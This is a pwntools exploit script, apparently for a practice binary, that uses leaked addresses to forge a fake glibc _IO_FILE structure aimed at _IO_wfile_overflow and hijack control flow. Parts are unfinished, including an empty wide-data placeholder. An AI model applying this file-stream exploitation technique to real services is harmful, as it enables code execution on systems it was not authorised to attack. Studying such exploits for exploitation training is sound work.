#!/usr/bin/env python3

from pwn import *

exe = ELF("./demo1_patched")
libc = ELF("./libc.so.6")
context.binary = exe


gdbscript = '''
b *fwrite + 179
b 24
dir glibc-2.35/libio
'''

def conn():
    if args.LOCAL:
        r = gdb.debug([exe.path], gdbscript)
        # if args.DEBUG:
        #     gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    r.recvuntil(b'win func is located at: ')
    win = r.recvline()
    win = int(win, 16)
    log.info(f"win: {hex(win)}")
    r.recvuntil(b'puts is located at: ') 
    puts = r.recvline()
    puts = int(puts, 16)
    log.info(f"puts: {hex(puts)}")
    r.recvuntil(b'Reading into stack buff located at: ')
    buf = r.recvline()
    buf = int(buf, 16)
    log.info(f"buf: {hex(buf)}")
    
    libc_base = puts - 0x80e50
    libc.address = libc_base
    log.info(f"libc: {hex(libc.address)}")
    
    # IO_wfile_overflow address
    IO_wfile_overflow = libc.symbols['_IO_wfile_overflow']
    log.info(f"IO_wfile_overflow: {hex(IO_wfile_overflow)}")
    _IO_2_1_stderr_ = libc.symbols['_IO_2_1_stderr_']
    # _IO_wide_data size is 0x80
    # _IO_jump_t size is 0xa0
    # _IO_FILE size is 0xe0
    
    trash = win + 0x4367
    # good luck pwning :)
    # gdb.attach(r, gdbscript)
    fake_file = p64(0xfbad2484) + p64(0) *12 
    fake_file += p64(_IO_2_1_stderr_)  + p64(3)
    fake_file += p64(0) * 2 + p64(trash) + p64(0) * 9
    fake_file += p64(IO_wfile_overflow)
    
    # fake__IO_wide_data = 
    
    
    r.sendline(fake_file)
    r.sendlineafter(b'Reading over file pointer\n', fake_file)
    r.interactive()


if __name__ == "__main__":
    main()
